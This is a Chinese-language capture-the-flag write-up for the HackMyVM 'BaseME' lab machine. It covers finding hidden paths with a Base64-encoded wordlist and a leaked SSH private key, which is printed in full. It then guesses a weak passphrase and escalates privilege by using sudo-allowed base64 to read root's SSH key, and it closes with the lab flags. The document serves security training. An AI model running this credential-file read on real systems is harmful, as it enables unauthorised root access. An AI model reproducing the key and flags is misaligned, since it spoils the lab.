---
title: MazeSec BaseME
date: 2025-04-01 17:30:00
categories: 
  - MazeSec
tags:
  - 敏感信息泄露
  - /etc/sudoers 配置不当
  - Base64 提权
---

# BaseME

项目地址：https://downloads.hackmyvm.eu/baseme.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a1e72aab69adaba3f87da58.png)

## 敏感信息泄露

### SSH 私钥

访问拿到一串 Base64 编码

![](https://pic1.imgdb.cn/item/6a1e7356b69adaba3f87db1d.png)

解码

![](https://pic1.imgdb.cn/item/6a1e7388b69adaba3f87db26.png)

查看源代码还能发现一串注释

![](https://pic1.imgdb.cn/item/6a1e73a2b69adaba3f87db2a.png)

猜测是字典之类的，之前的提示写所有需要的东西都是 BASE64，那么我们就把字典用 BASE64 编码之后再扫描

得到下面两个路径

```
/aWRfcnNhCg==
/cm9ib3RzLnR4dAo=
```

将两个文件名解码后得到

```
id_rsa
robots.txt
```

其中一个是 SSH 私钥

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

![](https://pic1.imgdb.cn/item/6a1e7420b69adaba3f87db42.png)

## 弱口令

### SSH

用户名为前面注释给出的提示，使用私钥连接发现需要密码

![](https://pic1.imgdb.cn/item/6a1e75b5b69adaba3f87db8b.png)

尝试之前在注释中看到的密码字典，每行都需要 Base64 一下

第一个密码就直接成功

```
aWxvdmV5b3UK
```

![](https://pic1.imgdb.cn/item/6a1e768cb69adaba3f87dbf7.png)

## 提权

### /etc/sudoers 配置不当

检查权限发现可以使用 Base64

![](https://pic1.imgdb.cn/item/6a1e76efb69adaba3f87dc22.png)

### Base64 提权

尝试读取 root 的私钥并解密输出

```
sudo /usr/bin/base64 "/root/.ssh/id_rsa" | base64 --decode
```

![](https://pic1.imgdb.cn/item/6a1e7751b69adaba3f87dc37.png)

然后 SSH 登录拿到 root 权限

![](https://pic1.imgdb.cn/item/6a1e77ebb69adaba3f87dc4e.png)

```
HMV8nnJAJAJA
HMVFKBS64
```